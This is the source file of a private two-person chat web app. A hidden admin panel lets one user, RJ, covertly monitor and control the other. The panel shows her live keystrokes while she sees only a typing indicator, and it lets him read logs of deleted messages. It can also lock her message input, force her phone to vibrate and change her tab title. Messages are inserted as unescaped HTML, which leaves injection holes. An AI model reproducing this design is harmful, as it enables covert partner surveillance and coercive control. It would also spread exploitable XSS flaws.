<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, viewport-fit=cover"/>
    <title>Chat Master v12.5 ULTRA</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://download.agora.io/sdk/release/AgoraRTC_N-4.20.0.js"></script>
    <style>
        :root { --bg: #03050a; --me: #1e293b; --you: #0f172a; }
        body { background: var(--bg); color: #f1f5f9; font-family: 'Inter', sans-serif; height: 100vh; overflow: hidden; margin: 0; }
        #chat-main { display: flex; flex-direction: column; height: 100%; max-width: 600px; margin: 0 auto; position: relative; background: var(--bg); }
        #messages { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 16px; scroll-behavior: smooth; }

        /* Bubbles */
        .msg-wrap { display: flex; flex-direction: column; width: 100%; position: relative; animation: fadeIn 0.2s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        .row-me { align-items: flex-end; } .row-you { align-items: flex-start; }
        .bubble { max-width: 85%; padding: 12px 14px 26px 14px; font-size: 15px; border-radius: 20px; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.2); cursor: pointer; }
        .me { background: var(--me); border: 1px solid #334155; border-bottom-right-radius: 4px; }
        .you { background: var(--you); border: 1px solid #1e293b; border-bottom-left-radius: 4px; }
        .ts-inside { position: absolute; bottom: 8px; right: 12px; font-size: 9px; opacity: 0.5; font-weight: 700; text-transform: uppercase; }

        /* Tools Underneath */
        .msg-tools { opacity: 0; transition: 0.2s; display: flex; gap: 12px; margin-top: 4px; padding: 0 8px; }
        .msg-wrap:hover .msg-tools { opacity: 1; }
        .tool-btn { color: #60a5fa; font-size: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }

        /* Heart Animation */
        .heart-float { position: fixed; bottom: 0; font-size: 2.5rem; pointer-events: none; animation: floatUp 3s ease-in forwards; z-index: 9999; }
        @keyframes floatUp { 0% { transform: translateY(0) scale(1); opacity: 1; } 100% { transform: translateY(-110vh) scale(2) rotate(30deg); opacity: 0; } }

        /* Modals */
        .modal-view { display: none; position: fixed; inset: 0; background: #03050a; z-index: 2000; overflow-y: auto; padding: 25px; }
        #lightbox { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000; align-items: center; justify-content: center; }
        
        #partner-name.has-media { color: #ef4444 !important; text-decoration: underline; cursor: pointer; }
    </style>
</head>
<body>

<div id="lightbox" onclick="this.style.display='none'">
    <img id="lightbox-img" class="max-w-[95%] max-h-[90%] rounded-lg shadow-2xl">
    <div class="absolute top-10 right-10 text-white text-3xl">‚úï</div>
</div>

<div id="video-grid" class="hidden fixed inset-0 bg-black z-[3000]">
    <div id="remote-video" class="w-full h-full"></div>
    <div id="local-video" class="absolute top-6 right-6 w-28 h-40 border border-white/20 rounded-2xl overflow-hidden shadow-2xl z-[3001]"></div>
    <button onclick="endCall()" class="absolute bottom-10 left-1/2 -translate-x-1/2 bg-red-600 p-6 rounded-full shadow-2xl active:scale-90 transition">üìû</button>
</div>

<div id="gallery-modal" class="modal-view">
    <div class="flex justify-between items-center mb-6">
        <h2 class="text-xl font-bold">Memory Gallery</h2>
        <button onclick="closeModals()" class="bg-white/10 px-4 py-1 rounded-full text-sm">Close</button>
    </div>
    <div id="gallery-content" class="grid grid-cols-2 gap-3"></div>
</div>

<div id="logs-modal" class="modal-view">
    <div class="flex justify-between items-center mb-6">
        <h2 class="text-xl font-bold text-red-500">Deleted Logs</h2>
        <div class="flex gap-2">
            <button onclick="clearAllLogs()" class="bg-red-600/20 text-red-500 px-4 py-1 rounded-full text-xs font-bold">Clear All</button>
            <button onclick="closeModals()" class="bg-white/10 px-4 py-1 rounded-full text-sm">Close</button>
        </div>
    </div>
    <div id="logs-content" class="space-y-4"></div>
</div>

<video id="pip-src" autoplay muted playsinline class="hidden"></video>
<canvas id="pip-canvas" width="400" height="250" class="hidden"></canvas>
<div id="overlay-bg" onclick="closeSidebar()" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-[900]"></div>

<div id="chat-main">
    <header class="p-4 border-b border-white/5 flex items-center justify-between bg-black/40 backdrop-blur-xl z-[50]">
        <div class="flex items-center gap-4">
            <button onclick="openSidebar()" class="text-2xl">‚ò∞</button>
            <div onclick="handleStatusClick()">
                <div class="font-bold text-lg leading-none" id="partner-name">...</div>
                <div id="partner-status" class="text-[11px] opacity-60">No status</div>
                <div id="live-preview" class="text-[9px] text-blue-400 italic h-2"></div>
            </div>
        </div>
        <div class="flex gap-2">
            <button onclick="initCall(false)" class="p-2 px-4 bg-white/5 rounded-full text-[10px] font-bold uppercase">Voice</button>
            <button onclick="initCall(true)" class="p-2 px-4 bg-blue-600 rounded-full text-[10px] font-bold uppercase">FaceTime</button>
        </div>
    </header>

    <main id="messages"></main>

    <footer class="p-4">
        <div id="staging-area" class="grid grid-cols-4 gap-2 mb-2"></div>
        
        <div id="reply-box" class="hidden bg-blue-500/10 p-3 rounded-t-2xl border-l-4 border-blue-600 flex justify-between items-center mb-[-10px] pb-5">
            <span id="reply-text" class="text-[11px] text-blue-300 italic"></span>
            <button onclick="cancelReply()">&times;</button>
        </div>

        <form id="chat-form" class="flex items-center bg-[#0d111c] border border-white/10 rounded-full p-1 pl-4 shadow-2xl">
            <label class="cursor-pointer opacity-50 p-2">
                üìé <input type="file" id="file-input" class="hidden" accept="image/*" multiple onchange="handleFileSelect(this)">
            </label>
            <input id="msg-input" placeholder="Message..." autocomplete="off" class="flex-1 bg-transparent py-3 px-2 text-sm outline-none disabled:opacity-20">
            <button type="submit" id="send-btn" class="bg-blue-600 text-white font-bold px-6 py-3 rounded-full text-[10px] uppercase">Send</button>
        </form>
    </footer>
</div>

<div id="sidebar" class="fixed left-[-300px] top-0 bottom-0 w-[280px] bg-[#080c14] z-[1000] p-6 flex flex-col transition-all duration-300 border-right border-white/5">
    <h2 id="me-name" class="text-center text-xl font-bold mb-8">...</h2>
    <div class="flex-1 space-y-3 overflow-y-auto pr-2">
        <button onclick="setStatus()" class="w-full text-left p-4 bg-white/5 rounded-2xl">‚ú® Set Status</button>
        <button onclick="toggleGallery(true)" class="w-full text-left p-4 bg-white/5 rounded-2xl">üñºÔ∏è View Gallery</button>
        
        <div id="rj-suite" class="hidden pt-6 mt-6 border-t border-white/10 space-y-3">
            <p class="text-[10px] text-red-500 font-black tracking-widest uppercase px-2">Admin Terminal</p>
            <button onclick="adminAction('vibrate')" class="w-full text-left p-4 bg-red-600/10 text-red-400 rounded-2xl font-bold border border-red-500/10">üì≥ Force Vibrate</button>
            <button onclick="adminAction('lovetap')" class="w-full text-left p-4 bg-pink-600/10 text-pink-400 rounded-2xl font-bold border border-pink-500/10">‚ù§Ô∏è Love Tap</button>
            <button onclick="toggleFocusMode()" id="focus-btn" class="w-full text-left p-4 bg-yellow-600/10 text-yellow-400 rounded-2xl font-bold border border-yellow-500/10">üîí Focus Mode: OFF</button>
            <button onclick="hijackTab()" class="w-full text-left p-4 bg-purple-600/10 text-purple-400 rounded-2xl font-bold border border-purple-500/10">üè∑Ô∏è Tab Hijack</button>
            <button onclick="viewDeletedLogs()" class="w-full text-left p-4 bg-white/5 rounded-2xl font-bold">üóëÔ∏è Deleted Logs</button>
            <button onclick="launchPiP()" class="w-full text-left p-4 bg-blue-600/10 text-blue-400 rounded-2xl font-bold">üöÄ Gaming Pop-out</button>
        </div>
    </div>
    <div id="clocks" class="mt-auto pt-4 border-t border-white/5 text-[10px] font-mono opacity-50 space-y-1"></div>
</div>

<script>
    const SB_URL = 'https://jwfgaulakwiwextmqbov.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp3ZmdhdWxha3dpd2V4dG1xYm92Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY2NzU1MTYsImV4cCI6MjA4MjI1MTUxNn0.DBOoI_wLNGyB1LLfXzyAbVvEkVMj9XcCJie-HAZ0_d4';
    const _db = supabase.createClient(SB_URL, SB_KEY);
    
    let me, you, chatChannel, focusActive = false, stagedFiles = [], unread = 0, lastTwo = [], flashTimer = 0, replyId = null, partnerStatusData = null;
    let rtc = { client: null, localVideoTrack: null, localAudioTrack: null };
    const AGORA_APP_ID = "4f6c6c2002784152a8366dec12f1b4c0";

    async function init() {
        const code = localStorage.getItem('chat_secret_code') || prompt("Access Code:");
        const { data } = await _db.from('chat_codes').select('*').eq('code', code).single();
        if(!data) return;
        me = data.username; you = (me === 'RJ' ? 'Allyvia' : 'RJ');
        localStorage.setItem('chat_secret_code', code);
        document.getElementById('me-name').textContent = me;
        if(me === 'RJ') document.getElementById('rj-suite').classList.remove('hidden');

        chatChannel = _db.channel('chat-v12-5');
        chatChannel
            .on('broadcast', { event: 'admin' }, p => handleAdminCommand(p.payload))
            .on('broadcast', { event: 'typing' }, p => {
                document.getElementById('live-preview').textContent = p.payload.text ? (me === 'RJ' ? `Typing: ${p.payload.text}` : `${you} is typing...`) : "";
            })
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'private_messages' }, (p) => {
                if(p.new.receiver === me) { unread++; flashTimer = 6; }
                loadMessages();
            })
            .on('postgres_changes', { event: '*', schema: 'public', table: 'chat_codes' }, loadStatuses)
            .subscribe();

        loadMessages();
        loadStatuses();
        setInterval(updateClocks, 1000);
        setInterval(drawPiP, 200);
    }

    // --- ADMIN COMMANDS ---
    function adminAction(type, data = {}) { chatChannel.send({ type: 'broadcast', event: 'admin', payload: { type, data } }); }
    
    function toggleFocusMode() {
        focusActive = !focusActive;
        document.getElementById('focus-btn').textContent = `üîí Focus Mode: ${focusActive ? 'ON' : 'OFF'}`;
        adminAction('focus', { active: focusActive });
    }

    function hijackTab() {
        const title = prompt("New Tab Title for her:");
        if(title) adminAction('hijack', { title });
    }

    function handleAdminCommand(payload) {
        if(payload.type === 'vibrate' && navigator.vibrate) navigator.vibrate([500, 200, 500]);
        if(payload.type === 'lovetap') {
            for(let i=0; i<15; i++) {
                const h = document.createElement('div'); h.className = 'heart-float';
                h.style.left = Math.random() * 100 + 'vw'; h.innerText = '‚ù§Ô∏è';
                document.body.appendChild(h); setTimeout(() => h.remove(), 3500);
            }
        }
        if(payload.type === 'focus') {
            document.getElementById('msg-input').disabled = payload.data.active;
            document.getElementById('msg-input').placeholder = payload.data.active ? "LOCKED BY ADMIN" : "Message...";
        }
        if(payload.type === 'hijack') document.title = payload.data.title;
    }

    // --- MESSAGING & DELETED LOGS ---
    async function loadMessages() {
        const { data } = await _db.from('private_messages').select('*').order('created_at', { ascending: false }).limit(40);
        const msgs = data.reverse();
        lastTwo = msgs.slice(-2);
        document.getElementById('messages').innerHTML = msgs.map(m => {
            const isMe = m.sender === me;
            const time = new Date(m.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
            return `<div class="msg-wrap ${isMe ? 'row-me' : 'row-you'}">
                <div class="bubble ${isMe ? 'me' : 'you'}" onclick="${m.file_url ? `openLightbox('${m.file_url}')` : ''}">
                    ${m.file_url ? `<img src="${m.file_url}" class="rounded-xl mb-2 w-full max-h-60 object-cover">` : ''}
                    ${m.message || ''}
                    <span class="ts-inside">${time}</span>
                </div>
                <div class="msg-tools">
                    <span class="tool-btn" onclick="setReply('${m.id}', '${(m.message || "Img").replace(/'/g, "\\'")}')">Reply</span>
                    ${isMe ? `<span class="tool-btn text-red-500" onclick="deleteMsg('${m.id}')">Delete</span>` : ''}
                </div>
            </div>`;
        }).join('');
        const b = document.getElementById('messages'); b.scrollTop = b.scrollHeight;
    }

    async function deleteMsg(id) {
        if(!confirm("Delete & Log?")) return;
        const { data: msg } = await _db.from('private_messages').select('*').eq('id', id).single();
        await _db.from('deleted_logs').insert([{ original_sender: msg.sender, content: msg.message, file_url: msg.file_url }]);
        await _db.from('private_messages').delete().eq('id', id);
        loadMessages();
    }

    async function viewDeletedLogs() {
        document.getElementById('logs-modal').style.display = 'block';
        const { data } = await _db.from('deleted_logs').select('*').order('deleted_at', { ascending: false });
        document.getElementById('logs-content').innerHTML = data.map(l => `
            <div class="p-3 bg-white/5 rounded-xl border border-red-500/20 text-xs">
                <div class="flex justify-between text-red-400 font-bold"><span>From: ${l.original_sender}</span><span>${new Date(l.deleted_at).toLocaleString()}</span></div>
                <p class="mt-1 opacity-80">${l.content || ''}</p>
                ${l.file_url ? `<img src="${l.file_url}" class="mt-2 h-20 rounded">` : ''}
            </div>`).join('') || 'No logs.';
    }

    async function clearAllLogs() { if(confirm("Clear forever?")) { await _db.from('deleted_logs').delete().neq('id', '00000000-0000-0000-0000-000000000000'); viewDeletedLogs(); } }

    // --- IMAGES & STATUS ---
    function handleFileSelect(input) {
        const files = Array.from(input.files).slice(0, 4 - stagedFiles.length);
        files.forEach(file => {
            const reader = new FileReader();
            reader.onload = e => { stagedFiles.push({ file, preview: e.target.result }); renderStaging(); };
            reader.readAsDataURL(file);
        });
    }

    function renderStaging() {
        document.getElementById('staging-area').innerHTML = stagedFiles.map((f, i) => `
            <div class="relative aspect-square">
                <img src="${f.preview}" class="w-full h-full object-cover rounded-lg border-2 border-blue-500">
                <button onclick="stagedFiles.splice(${i},1);renderStaging()" class="absolute -top-1 -right-1 bg-red-600 rounded-full w-5 h-5 text-[10px]">‚úï</button>
            </div>`).join('');
    }

    async function sendMsg(txt) {
        for(let f of stagedFiles) {
            const name = `img_${Date.now()}_${Math.random()}`;
            await _db.storage.from('chat-files').upload(name, f.file);
            const url = _db.storage.from('chat-files').getPublicUrl(name).data.publicUrl;
            await _db.from('private_messages').insert([{ sender: me, receiver: you, message: txt, file_url: url, reply_to: replyId }]);
            txt = ""; 
        }
        if(!stagedFiles.length) await _db.from('private_messages').insert([{ sender: me, receiver: you, message: txt, reply_to: replyId }]);
        stagedFiles = []; renderStaging(); document.getElementById('msg-input').value = ""; cancelReply();
    }

    async function loadStatuses() {
        const { data } = await _db.from('chat_codes').select('*');
        const p = data.find(u => u.username === you); if(!p) return;
        partnerStatusData = p;
        const nameEl = document.getElementById('partner-name');
        nameEl.textContent = you;
        document.getElementById('partner-status').textContent = p.status_text || "No status";
        p.status_media ? nameEl.classList.add('has-media') : nameEl.classList.remove('has-media');
    }

    function handleStatusClick() { if(partnerStatusData?.status_media) openLightbox(partnerStatusData.status_media); }
    async function setStatus() {
        const t = prompt("Status text:"); const m = prompt("Media URL (optional):");
        await _db.from('chat_codes').update({ status_text: t, status_media: m }).eq('username', me);
        loadStatuses();
    }

    // --- PIP & CLOCKS ---
    function drawPiP() {
        const c = document.getElementById('pip-canvas'); const x = c.getContext('2d');
        const flashing = flashTimer > 0 && flashTimer % 2 !== 0;
        x.fillStyle = flashing ? '#ff0000' : '#080c14'; x.fillRect(0,0,400,250);
        x.fillStyle = flashing ? '#000000' : '#3b82f6'; x.font = 'bold 30px Arial';
        x.fillText(unread > 0 ? `NEW: ${unread}` : 'NO MESSAGES', 20, 50);
        lastTwo.forEach((m, i) => {
            x.fillStyle = flashing ? '#000000' : (m.sender === 'RJ' ? '#60a5fa' : '#94a3b8');
            x.fillText(`${m.sender}: ${(m.message || "Img").substring(0, 25)}`, 20, 110 + (i*45));
        });
        if(flashTimer > 0) flashTimer--;
        const v = document.getElementById('pip-src'); if(!v.srcObject) v.srcObject = c.captureStream();
    }

    async function launchPiP() { unread = 0; try { await document.getElementById('pip-src').play(); await document.getElementById('pip-src').requestPictureInPicture(); } catch(e) {} }

    function updateClocks() {
        const opts = { hour: '2-digit', minute: '2-digit', hour12: true };
        const b = new Date().toLocaleTimeString('en-US', { ...opts, timeZone: 'Australia/Brisbane' });
        const i = new Date().toLocaleTimeString('en-US', { ...opts, timeZone: 'Asia/Amman' });
        document.getElementById('clocks').innerHTML = `Brisbane: ${b}<br>Irbid: ${i}`;
    }

    // --- AGORA CALLING ---
    async function initCall(video) {
        rtc.client = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });
        document.getElementById('video-grid').classList.remove('hidden');
        await rtc.client.join(AGORA_APP_ID, "main", null, null);
        rtc.localAudioTrack = await AgoraRTC.createMicrophoneAudioTrack();
        if(video) {
            rtc.localVideoTrack = await AgoraRTC.createCameraVideoTrack();
            rtc.localVideoTrack.play("local-video");
            await rtc.client.publish([rtc.localAudioTrack, rtc.localVideoTrack]);
        } else await rtc.client.publish([rtc.localAudioTrack]);
        rtc.client.on("user-published", async (u, t) => {
            await rtc.client.subscribe(u, t);
            if(t === "video") u.videoTrack.play("remote-video");
            if(t === "audio") u.audioTrack.play();
        });
    }

    async function endCall() {
        [rtc.localAudioTrack, rtc.localVideoTrack].forEach(t => { if(t) { t.stop(); t.close(); } });
        if(rtc.client) await rtc.client.leave();
        document.getElementById('video-grid').classList.add('hidden');
    }

    function openSidebar() { document.getElementById('sidebar').style.left = '0'; document.getElementById('overlay-bg').classList.remove('hidden'); }
    function closeSidebar() { document.getElementById('sidebar').style.left = '-300px'; document.getElementById('overlay-bg').classList.add('hidden'); }
    function closeModals() { document.querySelectorAll('.modal-view').forEach(m => m.style.display='none'); }
    function openLightbox(u) { document.getElementById('lightbox-img').src = u; document.getElementById('lightbox').style.display = 'flex'; }
    function setReply(id, txt) { replyId = id; document.getElementById('reply-text').textContent = `Reply: ${txt.substring(0,25)}...`; document.getElementById('reply-box').classList.remove('hidden'); }
    function cancelReply() { replyId = null; document.getElementById('reply-box').classList.add('hidden'); }
    async function toggleGallery(show) { if(show) { document.getElementById('gallery-modal').style.display='block'; const { data } = await _db.from('private_messages').select('file_url').not('file_url', 'is', null).order('created_at', { ascending: false }); document.getElementById('gallery-content').innerHTML = data.map(i => `<img src="${i.file_url}" class="rounded-xl aspect-square object-cover" onclick="openLightbox('${i.file_url}')">`).join(''); } }

    document.getElementById('chat-form').onsubmit = e => { e.preventDefault(); const v = document.getElementById('msg-input').value; if(v.trim() || stagedFiles.length) sendMsg(v); };

    document.getElementById('msg-input').oninput = e => {
        chatChannel.send({ type: 'broadcast', event: 'typing', payload: { text: e.target.value } });
    };

    init();
</script>
</body>
</html>
